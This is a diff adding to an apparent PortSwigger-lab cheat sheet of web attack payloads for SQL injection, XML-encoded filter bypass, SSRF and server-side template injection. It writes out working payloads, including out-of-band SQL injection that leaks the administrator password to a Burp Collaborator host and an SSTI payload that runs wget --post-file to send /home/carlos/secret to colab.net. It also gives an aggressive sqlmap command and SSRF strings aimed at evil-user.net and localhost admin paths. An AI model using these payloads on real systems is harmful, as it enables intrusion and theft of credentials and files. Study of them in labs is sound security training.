@@ -237,11 +237,17 @@ Connection: close
 
 ![Identify the input parameter vulnerable to SQL injection](identify-sqli-parameter.png)  
 
-<sup>Out of band data exfiltration SQL query, Example:</sup>  
+<sup>Out of band data exfiltration SQL query, tracking cookie Example:</sup>  
 
 ```sql
 TrackingId=x'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//'||(SELECT+password+FROM+users+WHERE+username%3d'administrator')||'.BURP-COLLABORATOR-SUBDOMAIN/">+%25remote%3b]>'),'/l')+FROM+dual--
 ```  
+
+<sup>Using SQLMAP to enumerate tracking cookie</sup>
+
+```bash
+sqlmap -v -r sqli-blind.txt --batch --random-agent --level=3 --risk=3 -p "TrackingId"
+```
 
 [PortSwigger Lab: SQL injection UNION attack, retrieving data from other tables](https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-data-from-other-tables)  
 
@@ -316,4 +322,76 @@ sqlmap -v -u 'https://TARGET.web.net/filter?category=*' -p 'category' --batch --
 
 ![Exploiting blind XXE to exfiltrate data usding a mlicious exploit DTD file](blind-xxe-exploit-dtd.png)  
 
+>SQL injection with filter bypass via XML encoding may allow extract of sensitive data.  
 
+<sub>Use Burp extension hackvector to obfuscate the payload.</sub>
+
+```xml
+<storeId><@hex_entities>1 UNION SELECT username || '~' || password FROM users<@/hex_entities></storeId>
+```
+
+
+[PortSwigger Lab: SQL injection with filter bypass via XML encoding](https://portswigger.net/web-security/sql-injection/lab-sql-injection-with-filter-bypass-via-xml-encoding)  
+
+<sup> XML Section incomplete </sup>  
+
+
+## SSRF - Server Side Request Forgery
+
+>SSRF attack cause the server to make a connection to internal services within the organization, and force the server to connect to arbitrary external systems, potentially leaking sensitive data.  
+
+<sub>SSRF exploitation examples</sub>
+
+```html
+/product/nextProduct?currentProductId=6&path=http://evil-user.net  
+
+stockApi=http://localhost:6566/admin  
+
+http://127.1:6566/admin  
+
+
+```
+
+[PortSwigger Lab: Exploiting XXE to perform SSRF attacks](https://portswigger.net/web-security/xxe/lab-exploiting-xxe-to-perform-ssrf)  
+
+```xml
+<!DOCTYPE test [ <!ENTITY xxe SYSTEM "http://localhost:6566/"> ]>  
+
+```  
+
+<sup> SSRF Section incomplete </sup>  
+
+
+## SSTI - Server Side Template Injection
+
+>Use the web framework native template syntax to inject a malicious payload into a **{{template}}**, which is then executed server-side.  
+
+<sub>SSTI exploit samples</sub>
+
+```html
+blog-post-author-display=user.name}}{{7*7}} 
+
+${7*7}
+<%= 7*7 %>
+${{7*7}}
+#{7*7}
+${foobar}
+${{<%[%'"}}%\.
+{% debug %}
+
+{% SkippyPeanut %}
+
+```
+
+```python
+{% import os %}
+{{os.system('wget http://colab.net --post-file=/home/carlos/secret')
+```  
+
+```html
+blog-post-author-display=user.name}}{%25+import+os+%25}{{os.system('wget%20http://colab.net%20--post-file=/home/carlos/secret')
+```
+
+[PortSwigger Lab: Basic server-side template injection data exfiltrate](https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-basic-code-context)  
+
+<sup> SSTI Section incomplete </sup>  
